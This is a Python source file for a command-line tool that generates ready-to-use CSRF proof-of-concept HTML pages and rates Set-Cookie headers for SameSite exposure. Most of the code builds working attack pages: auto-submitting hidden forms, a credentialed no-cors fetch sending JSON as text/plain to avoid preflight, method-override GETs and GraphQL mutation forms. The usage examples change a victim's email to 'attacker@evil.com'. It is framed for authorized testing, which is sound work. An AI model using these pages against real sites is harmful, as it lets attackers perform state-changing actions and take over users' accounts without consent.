#!/usr/bin/env python3
"""CSRF PoC generator + cookie/SameSite analyzer (offline, deterministic).

Generates copy-paste HTML PoCs for the shapes that still pay:

  * classic form-urlencoded POST
  * multipart form
  * JSON body sent as ``text/plain`` via fetch(no-cors, credentials=include)
  * method-override via GET + ``_method=POST``
  * GraphQL mutation as a form-urlencoded POST

It also analyzes a ``Set-Cookie`` string for SameSite/Secure/HttpOnly and
explains the practical CSRF exposure. It does **not** send requests.

Authorized testing only. Run the PoC against accounts you own, from a
different origin, with the victim's cookie present.

Usage:
  tools/csrf_poc.py -u https://target.com/api/change-email \
      -p email=attacker@evil.com --token-field csrf --token-value TEST

  tools/csrf_poc.py -u https://target.com/api/profile \
      --json '{"email":"attacker@evil.com"}' --out-dir ./csrf-pocs

  tools/csrf_poc.py --cookie 'session=abc; SameSite=Lax; Secure; HttpOnly'
"""
from __future__ import annotations

import argparse
import html
import json
import re
import sys
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Iterable


@dataclass
class PocVariant:
    name: str
    html: str
    notes: str
    requires: str


def _attrs(params: dict[str, str]) -> str:
    return "\n".join(
        f'  <input type="hidden" name="{html.escape(str(k), quote=True)}" '
        f'value="{html.escape(str(v), quote=True)}">'
        for k, v in params.items()
    )


def _page(title: str, body: str, script: str = "") -> str:
    return (
        "<!doctype html>\n<html><head><meta charset=\"utf-8\">"
        f"<title>{html.escape(title)}</title></head><body>\n"
        f"{body}\n{script}\n</body></html>\n"
    )


def _form(url: str, method: str, enctype: str | None, fields: dict[str, str],
          auto_submit: bool = True) -> str:
    enc = f' enctype="{enctype}"' if enctype else ""
    body = (
        f'<form action="{html.escape(url, quote=True)}" method="{method.upper()}"{enc}>\n'
        f"{_attrs(fields)}\n  <button type=\"submit\">Submit</button>\n</form>"
    )
    script = "<script>document.forms[0].submit();</script>" if auto_submit else ""
    return _page("CSRF PoC", body, script)


def build_pocs(
    url: str,
    params: dict[str, str] | None = None,
    method: str = "POST",
    token_field: str | None = None,
    token_value: str = "",
    json_body: dict | None = None,
    graphql_query: str | None = None,
    graphql_variables: dict | None = None,
) -> list[PocVariant]:
    """Return the applicable CSRF PoC variants. Pure; no network."""
    params = dict(params or {})
    if token_field:
        params[token_field] = token_value or "CSRF_TOKEN_HERE"
    variants: list[PocVariant] = []

    variants.append(PocVariant(
        name="form-urlencoded",
        html=_form(url, method, None, params),
        notes="Classic auto-submitting form. Works when the endpoint accepts form fields.",
        requires="Cookie sent cross-site (SameSite=Lax allows top-level POST? no — Lax blocks cross-site POST).",
    ))

    variants.append(PocVariant(
        name="multipart",
        html=_form(url, method, "multipart/form-data", params),
        notes="Multipart form; useful when the server rejects urlencoded but accepts multipart.",
        requires="Same cookie conditions as form-urlencoded.",
    ))

    if json_body is not None:
        payload = json.dumps(json_body)
        script = (
            "<script>\n"
            f"fetch({json.dumps(url)}, {{\n"
            "  method: 'POST',\n"
            "  mode: 'no-cors',\n"
            "  credentials: 'include',\n"
            "  headers: {'Content-Type': 'text/plain'},\n"
            f"  body: {json.dumps(payload)}\n"
            "});\n"
            "</script>"
        )
        variants.append(PocVariant(
            name="json-text-plain",
            html=_page("CSRF PoC (JSON)", "<p>PoC fires on load.</p>", script),
            notes=("Sends a JSON body as text/plain to avoid a CORS preflight. "
                   "Only works if the server parses JSON regardless of Content-Type."),
            requires="Server accepts text/plain JSON; cookies sent cross-site (SameSite=None or same-site top-level).",
        ))

    override_fields = dict(params)
    override_fields.setdefault("_method", method.upper())
    variants.append(PocVariant(
        name="method-override-get",
        html=_form(url, "GET", None, override_fields),
        notes=("GET form with _method=POST. Works when the backend honors method override "
               "while only POST is token-checked. Also try X-HTTP-Method-Override via fetch."),
        requires="Backend supports _method override; SameSite=Lax still sends cookies on top-level GET.",
    ))

    if graphql_query:
        gql = {"query": graphql_query}
        if graphql_variables:
            gql["variables"] = json.dumps(graphql_variables)
        variants.append(PocVariant(
            name="graphql-form",
            html=_form(url, "POST", None, gql),
            notes=("GraphQL mutation as form-urlencoded. GraphQL has no built-in CSRF "
                   "protection; works when the server accepts form content-type and no token."),
            requires="Endpoint accepts application/x-www-form-urlencoded; cookies cross-site.",
        ))

    return variants


_COOKIE_FLAGS = {"samesite", "secure", "httponly", "domain", "path", "max-age",
                 "expires", "partitioned", "priority"}


def analyze_cookie(set_cookie: str) -> dict:
    """Heuristic CSRF exposure from a Set-Cookie string. Pure."""
    raw = (set_cookie or "").strip()
    m = re.match(r"\s*Set-Cookie:\s*", raw, re.I)
    if m:
        raw = raw[m.end():]
    parts = [p.strip() for p in raw.split(";") if p.strip()]
    flags = {p.split("=", 1)[0].strip().lower() for p in parts}
    samesite = ""
    for p in parts:
        if p.lower().startswith("samesite="):
            samesite = p.split("=", 1)[1].strip().lower()
    secure = "secure" in flags
    httponly = "httponly" in flags

    if samesite == "strict":
        risk, note = "low", "SameSite=Strict; cross-site requests do not carry the cookie."
    elif samesite == "lax":
        risk, note = "medium", ("SameSite=Lax; cross-site POST is blocked, but top-level GET "
                                "navigation still sends the cookie. Test state-changing GETs.")
    elif samesite == "none":
        risk, note = ("high" if secure else "medium",
                      "SameSite=None; cross-site requests carry the cookie."
                      + ("" if secure else " Without Secure, modern browsers may reject it."))
    else:
        risk, note = "high", ("No SameSite attribute: browser-dependent (Chrome defaults to Lax; "
                              "older/other clients may send cross-site). Treat as Lax-or-worse.")
    if not httponly:
        note += " Cookie is readable by JS (XSS -> session theft)."
    return {
        "samesite": samesite or "(absent)",
        "secure": secure,
        "httponly": httponly,
        "risk": risk,
        "note": note,
    }


def _parse_params(items: Iterable[str]) -> dict[str, str]:
    out: dict[str, str] = {}
    for item in items:
        if "=" not in item:
            raise ValueError(f"param must be key=value: {item!r}")
        k, v = item.split("=", 1)
        out[k] = v
    return out


def _print_variant(v: PocVariant) -> None:
    print(f"\n===== {v.name} =====")
    print(f"# {v.notes}")
    print(f"# Requires: {v.requires}")
    print(v.html)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="CSRF PoC generator + cookie analyzer (offline).")
    ap.add_argument("-u", "--url", help="Target state-changing endpoint")
    ap.add_argument("-m", "--method", default="POST", help="Target method (default POST)")
    ap.add_argument("-p", "--param", action="append", default=[], help="key=value (repeatable)")
    ap.add_argument("--json", dest="json_body", help="JSON object body for the text/plain variant")
    ap.add_argument("--token-field", help="CSRF token field name (optional)")
    ap.add_argument("--token-value", default="", help="CSRF token value (default placeholder)")
    ap.add_argument("--graphql-query", help="GraphQL mutation string for the graphql-form variant")
    ap.add_argument("--graphql-variables", help="JSON object of GraphQL variables")
    ap.add_argument("--variant", action="append", default=[], help="Only emit this variant (repeatable)")
    ap.add_argument("--out-dir", help="Write one HTML file per variant")
    ap.add_argument("--cookie", help="Analyze a Set-Cookie string instead of generating PoCs")
    ap.add_argument("--json-out", action="store_true", help="Emit machine-readable JSON")
    args = ap.parse_args(argv)

    if args.cookie:
        analysis = analyze_cookie(args.cookie)
        if args.json_out:
            print(json.dumps(analysis, indent=2))
        else:
            print(json.dumps(analysis, indent=2))
            print(f"\nCSRF exposure: {analysis['risk'].upper()} — {analysis['note']}")
        return 0

    if not args.url:
        ap.error("--url is required (or use --cookie)")
    try:
        params = _parse_params(args.param)
        json_body = json.loads(args.json_body) if args.json_body else None
        gql_vars = json.loads(args.graphql_variables) if args.graphql_variables else None
    except (ValueError, json.JSONDecodeError) as exc:
        ap.error(str(exc))

    variants = build_pocs(
        args.url, params, method=args.method,
        token_field=args.token_field, token_value=args.token_value,
        json_body=json_body, graphql_query=args.graphql_query,
        graphql_variables=gql_vars,
    )
    if args.variant:
        wanted = {v.lower() for v in args.variant}
        variants = [v for v in variants if v.name in wanted]
        if not variants:
            ap.error(f"no matching variants; available: form-urlencoded, multipart, "
                     "json-text-plain, method-override-get, graphql-form")

    if args.json_out:
        print(json.dumps([asdict(v) for v in variants], indent=2))
    else:
        for v in variants:
            _print_variant(v)

    if args.out_dir:
        out = Path(args.out_dir)
        out.mkdir(parents=True, exist_ok=True)
        for v in variants:
            (out / f"{v.name}.html").write_text(v.html, encoding="utf-8")
        print(f"\nWrote {len(variants)} PoC file(s) to {out}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())